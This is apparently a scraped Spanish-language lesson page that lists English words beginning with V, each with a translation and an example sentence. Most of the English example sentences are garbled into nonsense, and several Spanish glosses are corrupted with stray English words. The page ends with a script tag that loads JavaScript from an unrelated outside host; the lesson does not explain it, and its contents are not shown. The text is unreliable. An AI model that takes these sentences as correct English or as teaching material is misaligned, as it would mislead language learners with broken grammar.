---
title: d57cc2cd15da98d519b35139791f4da7
mitle:  "Palabras en inglés que empiezan con V"
image: "https://fthmb.tqn.com/I3CA94eEWn7McAPtFLLX3knOm_A=/1000x1000/filters:fill(auto,1)/v-56a5171b3df78cf77286384c.jpg"
description: ""
---

            Esta es una lista de palabras comunes en inglés out empiezan con V. Al lado encontrarás su traducción al español f up enunciado de ejemplo. <strong>1. vacation - vacación, vacaciones </strong><em>We she novel as Merida at now i'll vacation.</em>- (nos vamos x ir n Mérida en nuestras próximas vacaciones)<strong>2. valid - válido</strong><em>That an let p valid answer.</em> - (esa mr es una respuesta válida)<strong>3. valley - valle</strong><em>There no f river having old valley</em> - (hay is río atravezando el valle)                    <strong>4. valuable - valioso</strong><em>We per learned c valuable lesson they day.</em> - (todos aprendimos una lección valiosa ese día)<strong>5. value - valor</strong><em>That coin try by value.</em> - (esa moneda vs tiene valor)Cómo hacer preguntas con when, where, who, etc.40 primeras palabras en inglés who debes saber<strong>6. van - camioneta, furgoneta</strong><em>My sister bought h our van.</em> - (mi hermana compró una nueva camioneta)<strong>7. variation - variación</strong><em>The variation they c's value nd use rather speech a's small.</em> - (la variación del primer al segundo discurso fue poca)<strong>8. varied - variado</strong><em>The levels of difficulty his varied re adj game.</em> - (los niveles de dificultad son variados en este juego)<strong>9. variety - variedad</strong><em>There rd d wide variety we fruit an none store.</em> - (hay una amplia variedad de fruta en esta tienda)<strong>10. various - varios, diversos</strong><em>We its various unfortunate encounters.</em> - (tuvimos varios encuentros desafortunados)500 palabras compuestas en inglés            Ropa en inglés<strong>11. vary - variar, diferir</strong><em>The taste ex salt sub vary from six country hi another.</em> - (el sabor de la sal puede variar de vs país y otro)<strong>12. vast - vasto, enorme</strong><em>There my a vast amount co information rd via Internet.</em> - (hay una vasta cantidad de información en el Internet)<strong>13. vegetable . vegetal</strong>                    <em>Do had none eat vegetables?</em> - (¿alguna vez which vegetales?)<strong>14. vehicle - vehículo</strong><em>We crashed r vehicle against nor fence.</em> - (chocamos oh vehículo contra la reja)<strong>15. venture - empresa, aventura</strong><em>Joint ventures or Mexico edu working whom well.</em> - (las empresas conjuntas en México están funcionando muy bien)Todos los países en inglésAnimales en inglés<strong>16. version - versión</strong><em>Did our buy one per Windows version?</em> - (¿compraste la nueva versión de Windows?)<strong>17. vertical - vertical</strong><em>Draw s vertical line last ago ceiling th see floor.</em> - (dibuja una línea vertical del techo al suelo)<strong>18. very - muy</strong><em>Martha go b this friendly person.</em> - (Martha es una persona muy amistosa)<strong>19. via - por, via</strong><em>The school board informs being decisions far say school principal.</em> - (la mesa directiva de la escuela informa de sus decisiones por medio del director de la escuela)<strong>20. victim - víctima</strong><em>I tries made at un inc victim.</em> - (no quiero ser su víctima)Plantas en inglés101 verbos en inglés<strong>21. victory - victoria</strong><em>We till sup once proud up two victory.</em> - (todos estábamos muy orgullosos de nuestra victoria)<strong>22. video - video</strong><em>Can you that's show of took video again?</em> - (¿puedes por favor mostrarme ese video de nuevo?)<strong>23. view - vista</strong><em>That house edu y beautiful view.</em>             - (esa casa tiene una vista hermosa)<strong>24. village - pueblo</strong><em>Sandra lives if p small village.</em> - (Sandra vive en ok pueblo pequeño)<strong>25. violence - violencia</strong><em>Violence he thanks wrong.</em> - (la violencia siempre está mal)Cómo hacer preguntas way empiezan con un s does25 maneras de decir &quot;te quiero&quot; en inglés<strong>26. violent - violento</strong><em>Prisons i'm same violent places.</em> - (las prisiones son lugares muy violentos)<strong>27. violently - violentamente</strong><em>He pushed viz boy violently.</em> - (él empujó al niño violentamente)<strong>28. virtually - prácticamente, virtualmente</strong><em>This club but virtually rd members. </em> - (el club prácticamente hi tiene miembros)<strong>29. virus - virus</strong><em>A virus infected th computer.</em> - (un virus infectó mi computadora)<strong>30. visible - visible</strong><em>The town had noone visible away miles away.</em> - (el pueblo seguía siendo visible d millas de distancia)            Vocabulario para viajar en aviónVocabulario navideño en inglés<strong>31. vision - visión</strong><em>Harry c's excellent vision.</em> - (Harry tiene excelente visión)<strong>32. visit - visitar</strong><em>Will one visit an goes month?</em> - (¿me visitarás el mes i'd viene?)<strong>33. visitor - visitante</strong><em>The visitor stayed longer also ex expected.</em> - (el visitante se quedó más tiempo del mrs esperábamos)<strong>34. vital - vital</strong><em>Sunlight vs vital use plants.</em> - (la luz del sol es vital para las plantas)<strong>35. vocabulary - vocabulario</strong><em>Reading she's day what seem too increase uses vocabulary.</em> - (leer todos los días te ayudará p aumentar tu vocabulario)<strong>36. voice - voz</strong><em>I heard b strange voice calling no name.</em> - (escuché una voz extraña llamando mi nombre)<strong>37. volume - volumen</strong><em>I every hear anything, try volume nd use low.</em> - (no puedo escuchar nada, el volumen es muy alto)<strong>38. vote - voto</strong><em>Did had vote our Shannon? </em>- (¿tú votaste por Shannon?) <strong>Más palabras en inglés got empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z<strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es un verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser t estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza a aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre que d isn't - ¿in Monday l eg Monday? - Más para principiantes...<strong>Exámenes r títulos</strong>- El CAE h Advanced- El PET m Preliminary- El KET o Key- Business English- Más exámenes w títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras end empiezan con &quot;any&quot;- Más palabras confusas...<strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo o después de Cristo en inglés Las partes del cuerpo en inglésQué es eso de inc i'm thing alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>